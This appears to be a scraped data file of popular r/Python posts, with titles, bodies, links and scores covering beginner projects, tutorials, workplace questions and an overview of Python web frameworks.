Hi, I talked to my boss recently about using python to assist me with data analysis, webscraping, and excel management. He said he doesn't have an issue but ask IT first. I asked my IT department and I got the response below. Is there some type of counter-argument I can come up with. I really would like to use python to be more efficient at work and keep developing my programming skills. If it matters I am currently an Electrical Engineer who works with a decent amount of data.

https://imgur.com/a/xVUGYJZ


Edit: I wanted to clarify some things. My initial email was very short: I simply asked for access to python to do some data analysis, computations, etc to help me with my job tasks. 

I just sent a follow up email to his response detailing what I am using python for. Maybe there was some miscommunication, but I don't intent on making my python scripts part of job/program where it would become a necessity and need to be maintained by anyone. Python would just be used as a tool to help me with my engineering analysis on projects I am working on and just improve my efficiency overall. So far I have not heard back from him. 


Our company is very old school, the people, equipment, technologies...",https://www.reddit.com/r/Python/comments/q6stpy/it_denied_my_request_for_python_at_work/,793,800
jvsx60,Getting Started With Google Map API in Python,,https://youtu.be/HChq5_7yTGk,15,802
dclphq,I made an application bot to apply to 100 internships with one click using Selenium and Python! Try it out for yourself (source code linked)!,,https://v.redd.it/le9tkt5c29q31,85,801
b9nbj6,A neural network is trained on images of space and then asked to hallucinate new images [OC],,https://v.redd.it/tlbbwr5ptdq21,45,804
9iadda,Python Cheat Sheet for Beginners and Experts ⋆ Download for Practice,"Python Cheat Sheet can be really helpful when you’re trying a set of exercises related to a specific topic or working on a project. Rather than explaining to you the importance of cheat sheets, why not just begin with the most useful Python resources available on the internet (for free) in the form of cheat sheet.

You can download these Cheat Sheets in JPG format and PDF too.

1. [Python for Data Science Cheat Sheet (Datacamp)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#1-python-for-data-science-cheat-sheet-datacamp)
2. [Python Cheat Sheet for Data Science: Basics (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#2-python-cheat-sheet-for-data-science-basics-dataquest)
3. [Beginner's Python Cheat Sheet (Python Crash Course)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#3-beginners-python-cheat-sheet-python-crash-course)
4. [Python Cheat Sheet for Data Science: Intermediate (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#4-python-cheat-sheet-for-data-science-intermediate-dataquest)
5. [Importing Data in Python Cheat Sheet (Datacamp)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#5-importing-data-in-python-cheat-sheet-datacamp)
6. [Python Numpy Cheat Sheet (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#6-python-numpy-cheat-sheet-dataquest)
7. [Python Data Visualization: Bokeh Cheat Sheet (Datacamp)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#7-python-data-visualization-bokeh-cheat-sheet-datacamp)
8. [Pandas Cheat Sheet: Python for Data Science (Dataquest)](https://sinxloud.com/python-cheat-sheet-beginner-advanced/#8-python-for-data-science-pandas-cheat-sheet-dataquest)

**Share & Learn!** Do add your favourite Python Cheat Sheet in the comments below.",https://www.reddit.com/r/Python/comments/9iadda/python_cheat_sheet_for_beginners_and_experts/,83,801
mqbkgm,"Enso 2.0 is out! Visual programming in Python, Java, R, and JavaScript. Written in Rust and running in WebGL.",,https://www.youtube.com/watch?v=fQvWMoOjmQk&ab_channel=Enso,129,801
gve07s,Images to ASCII,,https://v.redd.it/jtl8fskptj251,18,798
mmmqyo,Made my first web app using Python and Flask!,"Since English is not my first language, I frequently check definitions for complex words that I encounter. However, most of the online dictionaries contain unnecessary distractions such as pop ups and ads. So, I decided to create my own minimalist dictionary, improving both my coding skills and English vocabulary in the process :P

I used [this](https://dictionaryapi.dev/) API to fetch the definitions.

This is my very first flask project which I created in just 3 days. So, the code is quite ugly and the web app has quite a few bugs.

[Source](https://github.com/django0212/min-dic)

[The dictionary](http://min-dic.herokuapp.com/)",https://www.reddit.com/r/Python/comments/mmmqyo/made_my_first_web_app_using_python_and_flask/,56,799
kwalp2,Python changed the way I think,"I started to learn python during the beginning stages of pandemic. One thing i learned during the journey with python is that mistakes are part and parcel of learning. Do you agree with me that getting bugs while running  a program teaches you a lot than a tutorial video? Someday while we debugging our code and spent whole day but still can't figure out the bug and next day within 15 minutes you figure out that you have forget to put collon :) 

Don't give up! But Sometimes its ok to take rest when everything is going against you and comeback later. 

So guys what is your life lesson which you have learned during the journey with python. I would love to hear that.",https://www.reddit.com/r/Python/comments/kwalp2/python_changed_the_way_i_think/,119,801
dfo892,Announcing Support for Native Editing of Jupyter Notebooks in VS Code | Python,,https://devblogs.microsoft.com/python/announcing-support-for-native-editing-of-jupyter-notebooks-in-vs-code/,74,800
qp7rg7,"PSA: If you update a YML file used in CI to install or use Python 3.10, make sure to use “3.10” as a string. Otherwise is will most likely install Python 3.1.",,https://www.reddit.com/r/Python/comments/qp7rg7/psa_if_you_update_a_yml_file_used_in_ci_to/,100,796
av1wft,Turtle twiddling. For those of you who asked :D,,https://i.redd.it/o8dx22eq4yi21.gif,33,795
527yxc,Machine Learning in a Year (in Python) - From noob to professional,,https://medium.com/learning-new-stuff/machine-learning-in-a-year-cdb0b0ebd29c#.4pt8mv7lr,58,800
m1w8sm,Struggling to structure code in larger programs? Great resources a beginner might not find so easily,,https://death.andgravity.com/aosa,28,793
qtslkd,I made my first website for my Python project!,"A few weeks ago I shown a python project I was working on, and since then, I worked on it, and added a lot of new features! But the most important thing about this post, is that I made a website for presenting it! I can understand that this isn't fully Python related, but I thought that it was the best way for presenting my project, rather than looking at a readme :)  
Also, I'm proud to say that I used Python a bit to generate the HTML on the three languages that it uses hehe. [This is the page.](https://darvil82.github.io/PBar/)

Thank you for taking a look!

&#x200B;

[One of the showcase code blocks on the page.](https://preview.redd.it/231aombj1lz71.png?width=595&format=png&auto=webp&s=c49b8a6c878d70ed4250ab99007d37769150f07c)",https://www.reddit.com/r/Python/comments/qtslkd/i_made_my_first_website_for_my_python_project/,83,792
ohky4x,"An alternative to long if conditions, what are your thoughts?",,https://imgur.com/ooghpcE,180,795
f8qaea,I made a tool that allows you to batch copy text with CTRL+C (Python and Tkinter),,https://v.redd.it/szujviw14vi41,76,789
cv7ps7,Don't waste your money with Nathan K. Scott book,"I want to learn Python, I decided to order a book on amazon and reviews point out the following book:

""Python programming language, a complete guide for Beginners, intermediates and advanced"" by Nathan K. Scott.

**DO NOT BUY IT**

this book is a joke, 129 pages of grammar errors, sentences that don't make any sense, duplicated paragraphs and wrong exercises. All in a huge font and no page layout at all.

This is the most horrible book I ever read, it seems more a collection of school notes from a non-English student.

Don't waste your money as I did, stay away from this ""thing"".",https://www.reddit.com/r/Python/comments/cv7ps7/dont_waste_your_money_with_nathan_k_scott_book/,186,792
1tilfi,Congratulations r/Python! You are the SUBREDDIT OF THE DAY!,,http://www.reddit.com/r/subredditoftheday/comments/1tiler/december_23rd_2013_rpython_dont_worry_it_wont/,24,793
s3pmg2,"Python is a hammer, and we are carpenters, building houses","Something I struggled with for a long time is beginners, and it might just be a personal bias, but particular Python beginners. Both online and offline I see so many questions weekly that roughly fall into two camps

* Are there any universities that teach undergraduate CS purely using Python?
* How do I become a data analyst using Python\`?
* What should I learn to get a job as a python developer?
* How do I make quick money using Python?

While the other camp is roughly along the following lines

* I want to build a Python application that calls me and ask if I have taken my medicines.
* How do I build a website only using Python?
* I am playing game X, how do I train an AI to play the game perfectly?
* How do I make Python buy and sell crypto currency based on tweets?

I am not saying these are bad questions (from beginners), but they *irked* me. I was struggling to explain to beginners what the issue with questions such as these are. Is there an easy to understand analogy which would help. Finally, last night it struck me.

>Python is a hammer, and we are carpenters, building houses

Lets rephrase the initial questions with this background instead to show how absurd they become

* Are there any universities that teach carpentry only using a hammer?
* How do I become a roofer, framer, ship carpentry etc., only using a hammer?
* What should I learn to quickly get a job using a hammer?
* How do I make quick money using a hammer?

Now we see that the fundamental issue with the first sleeve of questions is that Python is a tool, we as programmers use, to solve problems. Limiting our toolbox to only using a single tool would make it impossible for us to work. **In addition we are offered jobs based on how well we are able to solve problems, not on the particular tools we know**. If I am adding someone to my team I am 99% sure they have never worked with our framework, and *I could not care less if they are Thor the god of hammers*. What I care about is if they can learn our framework, flow of work and seamlessly fit our team after half a year or so of on-board training.

Instead we should first look at what we are trying to do, and then pick the right tool for the job.

Similarly the issue with the second handful questions is unfamiliarity with programming and the amount of work required to make something. What I like with the carpentry analogy is also that it is easier to visualize the *scale*. A real life program (or a house) is a big project, something that requires multiple people, several weeks or months to make. 

Maybe the carpentry / hammer analogy will help next time someone asks:

""Hey I got this idea for a website, and I know you know Python, can you make it for me real quick?""",https://www.reddit.com/r/Python/comments/s3pmg2/python_is_a_hammer_and_we_are_carpenters_building/,137,789
o7zo2z,Saturday Daily Thread: Resource Request and Sharing!,"Found a neat resource related to Python over the past week? Looking for a resource to explain a certain topic?

Use this thread to chat about and share Python resources!",https://www.reddit.com/r/Python/comments/o7zo2z/saturday_daily_thread_resource_request_and_sharing/,14,793
6smmr2,"Just launched my first production app, and the feeling is amazing","i work as an oss tech for a bank, i have a semi mathy hs/college background.

about a year ago my boss asked if there's any way we could monitor some machines we have up on racks in our DR site, i raised my hand and said i could write a python script that pings them and generates reports... he said 'awesome' do it... trouble was i had only a fleeting idea of what python is and no clue how to actually implement this...

i got home and started researching, took a couple of days to even start scripting anything but about a week later i had something that works... running this script is now one of my daily tasks

i then started tinkering with it sneakily during downtime even though i was technically never given permission to do it and eventually came up with a way to scrape user data from the network 24/7, i made it a point that this would be my own doing so research was limited to how to implement specific tasks and not downloading a ready made script off of github...

i've been logging this data for a while so i figured i should do something with it and started working on a support facing tkinter front end to streamline the way we handle support calls and tickets...

i showed it to my boss and he had me do a demo for the whole team today doing our team meeting... told everyone 'i encourage you to try it so we can get the bugs out, i'm later going to *tell* you to use it'... he said i'd also get dev time to improve it... everyone liked it and i've been getting good feedback about it... the feeling is amazing and i thought i'd share it with this community and maybe get some of your stories

EDIT: holy crap gold, and not for saying something silly, thank you kind stranger

EDIT 2: this kind of grew, i really want to thank everyone for the kind words of encouragement, i really only posted because i felt really excited pacing around the house after that meeting and felt i had to vent it all somehow, but this subreddit's response has been phoenomenal and has done a lot to further embolden me so i'm even more determined to progress now... thank all of you",https://www.reddit.com/r/Python/comments/6smmr2/just_launched_my_first_production_app_and_the/,95,790
zmgm6b,Python 3.11 delivers.,,https://twitter.com/pypi/status/1603089763287826432,68,788
zzv4zt,1 year ago I started building Practice Probs - a site with 138 programming practice problems primarily focused on Python for data science,"[Link](https://www.practiceprobs.com/)

(Note: most of the solutions are gated, but **all** of the problems are free.)

One year ago, I came up with an idea to build a site similar StackOverflow, but with challenge problems to help people learn programming & data science topics. After a lot of effort (and some help along the way), I now have 138 problems on my platform.

- [Git](https://www.practiceprobs.com/problemsets/git/)
- [Google BigQuery](https://www.practiceprobs.com/problemsets/google-bigquery/)
- [Matplotlib](https://www.practiceprobs.com/problemsets/matplotlib/)
- [Metrics](https://www.practiceprobs.com/problemsets/metrics/)
- [pytest](https://www.practiceprobs.com/problemsets/pytest/)
- [Python NumPy](https://www.practiceprobs.com/problemsets/python-numpy/)
- [Python Pandas](https://www.practiceprobs.com/problemsets/python-pandas/)
- [Python Sparse Matrices](https://www.practiceprobs.com/problemsets/python-sparse-matrices/)
- [Pytorch](https://www.practiceprobs.com/problemsets/pytorch/)
- [Redis](https://www.practiceprobs.com/problemsets/redis/)
- [Regular Expressions In Python](https://www.practiceprobs.com/problemsets/regular-expressions-in-python/)
- [Selenium With Python](https://www.practiceprobs.com/problemsets/selenium-with-python/)
- [YouTube Data API](https://www.practiceprobs.com/problemsets/youtube-data-api/)

Hopefully some of you find this fun and helpful.",https://www.reddit.com/r/Python/comments/zzv4zt/1_year_ago_i_started_building_practice_probs_a/,26,787
d3afje,TIL if you type 'import antigravity' into a Python command line your default browser opens the XKCD comic 'Python' in a tab.,,http://www.explainxkcd.com/wiki/index.php?title=353:_Python#Trivia,35,789
aqapmb,"Prototype of Python-powered IoT device, gets how many subs are in r/Python plays sound when new ones are added",,https://i.redd.it/ljbqcf165eg21.jpg,57,789
oot77i,Simple Django 3 tutorial project for beginners,"Hi, everyone!

I made 14 videos with a simple Django 3 Blog project for beginners.

So the touched topics are:

* Django project structure
* Routing a User's request and its handling, making a response to the User
* Using HTML templates and template inheritance (with Bootstrap 4)
* Storing data in a database with Models. Creating posts
* Using Tags for Posts, and ManyToMany relationships in Django.
* Class based views and Mixins.
* How to use Forms. Creating tags via Django forms.
* Creating posts via Django forms.
* Updating objects (posts and tags) via forms.
* And Deleting objects via forms.
* Using custom CSS (small admin panel for creating, updating and deleting posts and tags)
* How to restrict an access to certain pages.
* Pagination
* Basic search

The Demo video (1 m. 27 sec.):  
Is the first it the playlist

And the Youtube playlist:  
[https://www.youtube.com/watch?v=WeaL8o19D\_E&list=PLe4mIUXfbIqbbqgDSY6z9orgzIwvYZjtw](https://www.youtube.com/watch?v=WeaL8o19D_E&list=PLe4mIUXfbIqbbqgDSY6z9orgzIwvYZjtw)

Thanks for watching!",https://www.reddit.com/r/Python/comments/oot77i/simple_django_3_tutorial_project_for_beginners/,3,785
k003t6,A complete web app to convert YouTube videos to MP3 files (with source for learning purpose),"Hi guys, I am learning Web Dev and hope to be a front end web developer soon, and I believe the best way is to practice. Then I made a the site with some technology which could be quite complicated for such a simple site, but I can learn a lot from that. As I learn all these stuff by myself after work, so feel free to correct me if I have done something wrong or any feedback would be much appreciated. Finally, I am not sure if I am close enough to be a junior web developer ? Any suggestion what else I should deep in? Thanks alot 

Here are some tech tools have been used:

\- Flask, SQLAlchemy, Flask-Dance

\- Google Cloud Logging 

\- Custom Web Socket Server for progess bar

\- VueJS, WebPack, Bootstrap for front end

\- PostgreSQL

\- PyTest

\- Social Authentication 

\- I also experiment with Google Cloud Firestore, which you can find in web/gdata folder

\- Supervisor, gunicorn with Nginx set up for production hosting 

The site basically let you convert any YT video less than 10 mins (you can configure in source code) to MP3 files, save it to DropBox, basic profile with history. 

Repo here: [https://github.com/infantiablue/converter](https://github.com/infantiablue/converter)

Live site here: [https://convertca.com](https://convertca.com/)

Cheers",https://www.reddit.com/r/Python/comments/k003t6/a_complete_web_app_to_convert_youtube_videos_to/,76,784
u2b3r9,"Name a better learning resource than Schafer Corey, I'll wait","I am really amazed by Schafer Corey on [YouTube](https://www.youtube.com/c/Coreyms/videos) especially since I am not the the type of guy that enjoys watching videos to learn, I am honestly in awe with his teaching skills and it inspires me to write blogs. I will be very curious to see if you guys have other high quality content.
I am well aware that you won't become proficient just by watching his videos but his tutorials get straight to the point and you understand the concept and you can build new things!",https://www.reddit.com/r/Python/comments/u2b3r9/name_a_better_learning_resource_than_schafer/,149,785
99mmh3,A Python class,,https://i.redd.it/fdms8ww1jth11.jpg,57,784
nikpnf,I just wanted to share a script I've made to my dad,"I've been learning python since January this year but never made a ""useful"" project. So my dad uses excel to keep track of his investments but has to update the stocks prices by hand, which takes a while. So recently I've found about openpyxl and thought why not automate this task? And so I did, using pandas\_datarequest for the stock prices, openpyxl to communicate with the file and tqdm for some cool progress bars. He liked it, turned a 10 minute boring process into a ≈1 min script.

Edit:  [here](https://github.com/BrunoPanizzi/stockPrices) is the github",https://www.reddit.com/r/Python/comments/nikpnf/i_just_wanted_to_share_a_script_ive_made_to_my_dad/,76,788
bl2d33,Guido with a painting of himself that was auctioned yesterday night at the PyLadies Auction 2019!,,https://i.redd.it/hss397e59gw21.jpg,60,787
hzwqgf,I wrote an app that plays horror music when my code breaks,"Writing code can be a very jarring experience.

You put on some upbeat, happy music, and then you start coding. But even when the code is completely broken, the same music continues...

We don't let this happen in movies, so why let it happen when we code? I've tried to solve this problem by coming up with a solution called ""Coding Mood"".

**It plays horror music when your code breaks** ***e.g. when unit tests fail or it just crashes.***

For a full demo of it in action, check out my video:  [https://youtu.be/1LKTrZamxZk](https://youtu.be/1LKTrZamxZk)

There are two main parts to my solution. The first is a React Native mobile app, which connects to a server using a websocket. When the state of my code changes, the server pushes it to the mobile app and the music coming from the app changes.

The server is written using Python asyncio and Starlette. To those of you who haven't checked out Starlette before, it's really great. If you're familiar with Node.js and Express you'll be right at home. 

Currently the server just parses the test results when they are POST-ed to it, and if it finds any failures, it broadcasts to all connected clients.

The Python code for the server can be found here:  [https://github.com/theartofsoftware/coding-mood-server](https://github.com/theartofsoftware/coding-mood-server) 

The Javascript for the mobile app is here: [https://github.com/theartofsoftware/coding-mood-app](https://github.com/theartofsoftware/coding-mood-app)

I would love to see what other people can do with this. The code is a bit messy but it's quite simple.",https://www.reddit.com/r/Python/comments/hzwqgf/i_wrote_an_app_that_plays_horror_music_when_my/,34,780
dppe0e,I made a crude 5-axis CNC Simulator unsing PyQt5 and OpenGL,,https://v.redd.it/fusl8sh8dwv31,40,777
i6g0lk,"Developers whose first programming language was Python, what were the challenges you encountered when learning a new programming language?",,https://www.reddit.com/r/Python/comments/i6g0lk/developers_whose_first_programming_language_was/,236,778
llun7j,"""Rich"" Colorful Dashboard Layout in Shell/Terminal with Python",,https://youtu.be/NoYZtYBiYbo,27,777
ffxioo,"I made a terminal emulator with Vim-like modes and keybindings, a status line and an inline Python interpreter.",,https://v.redd.it/dn7st6podol41,40,772
c1b3na,Moon and Earth during a month long gravity simulation!,,https://i.redd.it/a7xjewxljq431.gif,99,781
kdblfo,Just made my first “real” program and I’m super proud!,"It’s nothing crazy, it’s really just manipulating a couple of lists, but I still think it’s super cool!

Edit: forgot to post the code lol

todo = []
done = []

x = ""Nothing""
todolength = 0
donelength = 0

while 0 == 0:
    print(""OPTIONS:"")
    print(""add: adds an item to your 'to do' list"")
    print(""remove: removes an item from your 'to do' list without moving it to your 'done' list"")
    print(""done: checks an item off your 'to do' list and moves it to your 'done' list"")
    print(""clr: opens the 'clear' menu"")
    print(""chk: opens the 'check' menu"")
    print(""What would you like do do?"")
    response = input()
    if response == ""add"":
        print(""What would you like to add? Type 'cancel' to cancel."")
        x = input()
        if x == ""cancel"":
            useless = 0
        else:
            todo.append(x)
            todolength = todolength + 1
            print(""%s added"" %x)
            input(""Press enter to continue"")
    elif response == ""remove"":
        if todolength == 0:
            print(""To do list empty! Congrats!"")
            input(""Press enter to continue"")
        else:
            print(""What would you like to remove? Type 'cancel' to cancel."")
            x = input()
            if x == ""cancel"":
                useless = 0
            elif x in todo:
                todo.remove(x)
                print(""%s removed"" %x)
                input(""Press enter to continue"")
            else:
                print(""ERROR 1: ITEM NOT IN LIST"")
                input(""Press enter to continue"")
    elif response == ""done"":
        if todolength == 0:
            print(""To do list empty! Congrats!"")
            input(""Press enter to continue"")
        else:
            print(""What would you like to mark 'done'? Type 'cancel' to cancel."")
            x = input()
            if x == ""cancel"":
                useless = 0
            elif x in todo:
                todo.remove(x)
                todolength = todolength - 1
                done.append(x)
                donelength = donelength + 1
                print(""Success! %s moved to 'done' list."" %x)
                input(""Press enter to continue"")
            else:
                print(""ERROR 1: ITEM NOT IN LIST"")
                input(""Press enter to continue"")
    elif response == ""clr"":
        print(""CLEAR MENU:"")
        print(""todo: clears 'to do' list"")
        print(""done: clears 'done' list"")
        print(""all: clears 'to do' and 'done' list"")
        print(""Type 'cancel' to cancel"")
        x = input()
        if x == ""cancel"":
            useless = 0
        elif x == ""todo"":
            print(""Are you sure? (type 'YES' to confirm)"")
            response = input()
            if response == ""YES"":
                todo.clear()
                todolength = 0
                print(""To do list cleared"")
                input(""Press enter to continue"")
            else:
                useless = 0
        elif x == ""done"":
            print(""Are you sure? (type 'YES' to confirm)"")
            response = input()
            if response == ""YES"":
                done.clear()
                donelength = 0
                print(""Done list cleared"")
                input(""Press enter to continue"")
        elif x == ""all"":
            print(""Are you sure? (type 'YES' to confirm)"")
            response = input()
            if response == ""YES"":
                todo.clear()
                done.clear()
                todolength = 0
                donelength = 0
                print(""All lists cleared"")
                input(""Press enter to continue"")
            else:
                useless = 0
        else:
            print(""ERROR 2: INVALID INPUT"")
            input(""Press enter to continue"")
    elif response == ""chk"":
        print(""CHECK MENU:"")
        print(""todo: checks 'to do' list"")
        print(""done: checks 'done' list"")
        print(""all: checks both lists"")
        print(""Type 'cancel' to cancel."")
        x = input()
        if x == ""cancel"":
            useless = 0
        elif x == ""todo"":
            print(todo)
            input(""Press enter to continue"")
        elif x == ""done"":
            print(done)
            input(""Press enter to continue"")
        elif x == ""all"":
            print(""To do:"")
            print(todo)
            print(""Done:"")
            print(done)
            input(""Press enter to continue"")
        else:
            print(""ERROR 2: INVALID INPUT"")
            input(""Press enter to continue"")
    else:
        print(""ERROR 2: INVALID INPUT"")
        input(""Press enter to continue"")

I know it looks all messed up that’s just because I’m on mobile rn lol",https://www.reddit.com/r/Python/comments/kdblfo/just_made_my_first_real_program_and_im_super_proud/,73,782
jye99o,"Hey, I made a Python For Beginners Crash Course! I laid out everything I remember finding hard to understand in the beginning, and I tried to organize everything in the best way possible! Do you guys have some feedback?",,https://www.youtube.com/watch?v=29VsYfLS7k8&ab_channel=PedroTech,40,781
el3twl,"Just wanted to give everyone a heads up, the Introduction to Computer Science and Programming Using Python on EdX is a free MIT course starting Jan 22 and open for enrollment.",,https://www.edx.org/course/introduction-to-computer-science-and-programming-7,63,780
ljurx4,Coding an Age Prediction Neural Network in 10 Minutes w/ Python!,,https://youtu.be/NxNrIwejnPI,20,777
xbefip,youtube-dl has a JavaScript interpreter written in pure Python in 870 lines of code,,https://github.com/ytdl-org/youtube-dl/blob/master/youtube_dl/jsinterp.py,52,771
u77fce,"78 Python data science practice problems in a single github repo including numpy, pandas, matplotlib, scipy, regex, pytorch",,https://github.com/practiceprobs/problemsets,23,777
cr3l7z,A Beginner’s Introduction to Python Web Frameworks,"Hi, we recently updated an article on Python web frameworks at our company blog. I was wondering if there are any other frameworks you find useful that we missed and should add to the list. I’m copying the entire list here (each entry also has some sample code, but I’m excluding that). Please let me know if you think we should add any framework. 

(and, if you’d like to check out the full article, you can find it here: [A Beginner’s Introduction to Python Web Frameworks](https://stxnext.com/blog/2018/09/27/beginners-introduction-python-frameworks/?utm_medium=social&utm_source=reddit&utm_campaign=2019-08-jd))

## Django

**The most popular Python framework is Django, hands down.** Django’s trademark is that it offers all the tools you need to build a web application within a single package, from low- to high-end.

Django applications are based on a design pattern similar to MVC, the so-called MVT (Model-View-Template) pattern. Models are defined using the Django ORM, while SQL databases are mainly used as storage.

Django has a built-in admin panel, allowing for easy management of the database content. With minimal configuration, this panel is generated automatically based on the defined models.

Views can include both functions and classes, and the assignment of URLs to views is done in one location (the urls.py file), so that after reviewing that single file you can learn which URLs are supported. Templates are created using a fairly simple Django Templates system.

Django is praised for strong community support and detailed documentation describing the functionality of the framework. This documentation coupled with getting a comprehensive environment after the installation makes the entry threshold rather low. Once you go through [the official tutorial](https://docs.djangoproject.com/en/1.11/intro/tutorial01/), you’ll be able to do most of the things required to build an application.

**Unfortunately, Django’s monolithism also has its drawbacks.** It is difficult, though not impossible, to replace one of the built-in elements with another implementation. For example, using some other ORM (like SQLAlchemy) requires abandoning or completely rebuilding such items as the admin panel, authorization, session handling, or generating forms.

Because Django is complete but inflexible, it is suitable for standard applications (i.e. the vast majority of software projects). However, if you need to implement some unconventional design, it leads to struggling with the framework, rather than pleasant programming.

## Flask

Flask is considered a microframework. It comes with basic functionality, while also allowing for easy expansion. Therefore, **Flask works more as the glue that allows you to join libraries with each other.**

For example, “pure Flask” does not provide support for any storage, yet there are many different implementations that you can install and use interchangeably for that purpose (such as Flask-SQLAlchemy, Flask-MongoAlchemy, and Flask-Redis). Similarly, the basic template system is Jinja2, but you can use a replacement (like Mako).

The motto of this framework is “one drop at a time,” and this is reflected in its comprehensive documentation. The knowledge of how to build an application is acquired in portions here; after reading a few paragraphs, you will be able to perform basic tasks.

You don’t have to know the more advanced stuff right away—you’ll learn it once you actually need it. Thanks to this, students of Flask can gather knowledge smoothly and avoid boredom, making Flask suitable for learning.

**A large number of Flask extensions, unfortunately, are not supported as well as the framework itself.** It happens quite often that the plug-ins are no longer being developed or their documentation is outdated. In cases like these, you need to spend some time googling a replacement that offers similar functionality and is still actively supported.

When building your application with packages from different authors, you might have to put quite a bit of sweat into integrating them with each other. You will rarely find ready-made instructions on how to do this in the plug-ins’ documentation, but in such situations the Flask community and websites such as Stack Overflow should be of help.

## Pyramid

Pyramid, the third noteworthy Python web framework, is rooted in two other products that are no longer developed: Pylons and repoze.bfg. **The legacy left by its predecessors caused Pyramid to evolve into a very mature and stable project.**

The philosophies of Pyramid and Django differ substantially, even though both were released in the same year (2005). Unlike Django, Pyramid is trivial to customize, allowing you to create features in ways that the authors of the framework themselves hadn’t foreseen. It does not force the programmer to use framework’s idioms; it’s meant to be a solid scaffolding for complex or highly non-standard projects.

Pyramid strives to be persistence-agnostic. While there is no bundled database access module, a common practice is to combine Pyramid with the powerful, mature SQLAlchemy ORM. Of course, that’s only the most popular way to go. Programmers are free to choose whatever practices suit them best, such as using the peewee ORM, writing raw SQL queries, or integrating with a NoSQL database, just to name a few.

All options are open, though this approach requires a bit of experience to smoothly add the desired persistence mechanisms to the project. The same goes for other components, such as templating.

Openness and freedom are what Pyramid is all about. Modules bundled with it relate to the web layer only and users are encouraged to freely pick third-party packages that will support other aspects of their projects.

**However, this model causes a noticeable overhead at the beginning of any new project,**because you have to spend some time choosing and integrating the tools your team is comfortable with. Still, once you put the effort into making additional decisions during the early stages of the work, you are rewarded with a setup that makes it easy and comfortable to start a new project and develop it further.

Pyramid is a self-proclaimed “start small, finish big, stay finished framework.” This makes it an appropriate tool for experienced developers who are not afraid of playing the long game and working extra hard in the beginning, without shipping a single feature within the first few days. Less experienced programmers may feel a bit intimidated.

## web2py

Created in 2007, web2py is a framework originally designed as a teaching tool for students, so the main concern for its authors was ease of development and deployment.

Web2py is strongly inspired by Django and Ruby on Rails, sharing the idea of **convention over configuration. In other words, web2py provides many** ***sensible defaults*** **that allow developers to get off the ground quickly.**

This approach also means there are a lot of goodies bundled with web2py. You will find everything you’d expect from a web framework in it, including a built-in server, HTML-generating helpers, forms, validators, and many more—nothing unusual thus far, one could argue. Support for multiple database engines is neat, though it’s a pretty common asset among current web frameworks.

However, some other bundled features may surprise you, since they are not present in other frameworks:

* helpers for creating [JavaScript](https://stxnext.com/services/javascript-development/)\-enabled sites with jQuery and Ajax;
* scheduler and cron;
* 2-factor authentication helpers;
* text message sender;
* an event-ticketing system, allowing for automatic assignment of problems that have occurred in the production environment to developers.

The framework proudly claims to be a full-stack solution, providing everything you could ever need.

Web2py has extensive documentation available online. It guides newcomers step by step, starting with a short introduction to the Python language. The introduction is seamlessly linked with the rest of the manual, demonstrating different aspects of web2py in a friendly manner, with lots of code snippets and screenshots.

**Despite all its competitive advantages, web2py’s community is significantly smaller than Django’s, or even Pyramid’s.** Fewer developers using it means your chances of getting help and support are lower. The official mailing list is mostly inactive.

Additionally—and unfortunately—web2py is not compatible with Python 3 at the moment. This state of things puts the framework’s prospects into question, as support for Python 2 ends in 2020. This issue is being addressed on the project’s github. [Here](https://github.com/web2py/web2py/issues/1353) is where you can track the progress.

## Sanic

**Sanic differs considerably from the aforementioned frameworks because unlike them, it is based on asyncio**—Python’s toolbox for asynchronous programming, bundled with the standard library starting from version 3.4.

In order to develop projects based on Sanic, you have to grasp the ideas behind asyncio first. This involves a lot of theoretical knowledge about coroutines, concurrent programming caveats, and careful reasoning about the data flow in the application.

Once you get your head around Sanic/asyncio and applies the framework to an appropriate problem, the effort pays off. Sanic is especially useful when it comes to handling long-living connections, such as websockets. If your project requires support for websockets or making a lot of long-lasting external API calls, Sanic is a great choice.

Another use case of Sanic is writing a “glue-web application” that can serve as a mediator between two subsystems with incompatible APIs. Note that it requires at least Python 3.5, though.

The framework is meant to be very fast. One of its dependencies is [uvloop](https://github.com/MagicStack/uvloop)—an alternative, drop-in replacement for asyncio’s not-so-good built-in event loop. Uvloop is a wrapper around libuv, the same engine that powers Node.js. According to the uvloop documentation, this makes asyncio work 2–4 times faster.

**In terms of “what’s in the box,” Sanic doesn’t offer as much as other frameworks.** It is a microframework, just like Flask. Apart from routing and other basic web-related goodies like utilities for handling cookies and streaming responses, there’s not much inside. Sanic imitates Flask, for instance by sharing the concept of Blueprints—tiny sub-applications that allow developers to split and organize their code in bigger applications.

Sanic also won’t be a good choice for simple CRUD applications that only perform basic database operations. It would just make them more complicated with no visible benefit.

## Japronto

Have you ever imagined handling 1,000,000 requests per second with Python?

It seems unreal, since Python isn’t the fastest programming language out there. But when a brilliant move was made to add asyncio to the standard library, it opened up countless possibilities.

Japronto is a microframework that leverages some of them. As a result, **this Python framework was able to cross the magical barrier of 1 million requests handled per second.**

You may still be at a loss as to how that is possible, exactly.

It all comes down to 2 aces up Japronto’s sleeve: uvloop and PicoHTTPParser. Uvloop is an asyncio backend based on libuv, while PicoHTTPParser is a lightweight HTTP headers parser written in C. All core components of the framework are also implemented in C. A wide variety of low-level optimizations and tricks are used to tweak performance.

Japronto is designed for special tasks that could not be accomplished with bloated mainstream frameworks. It is a perfect fit for problems where every nanosecond counts. Knowledgeable developers, obsessed with optimization, will reap all of its possible benefits.

Additionally, Japronto is meant to provide a solid foundation for microservices using REST APIs with minimal overhead. In other words, there’s not much in the box. Developers only need to set up routing and decide which routes should use synchronous or asynchronous handlers.

It might seem counterintuitive, but if a request can be handled in a synchronous way, you shouldn’t try to do it asynchronously, as the overhead of switching between coroutines will limit performance.

**What is quite unfortunate is that Japronto is not being actively developed.** On the other hand, the project is licensed under MIT, and the author claims he is willing to accept any contributions. Like Sanic, the framework is meant to work with Python 3.5+ versions.

## aiohttp

Aiohttp is another library based on asyncio, the modern Python toolkit for writing asynchronous code. **Not meant to be a framework in a strict sense, aiohttp is more of a toolbox, supplementing the async arsenal with everything related to HTTP.**

This means aiohttp is helpful not only for writing server applications, but also to clients. Both will benefit from asyncio’s goodies, most of all the ability to handle thousands of connections at the same time, provided the majority of operations involves I/O calls.

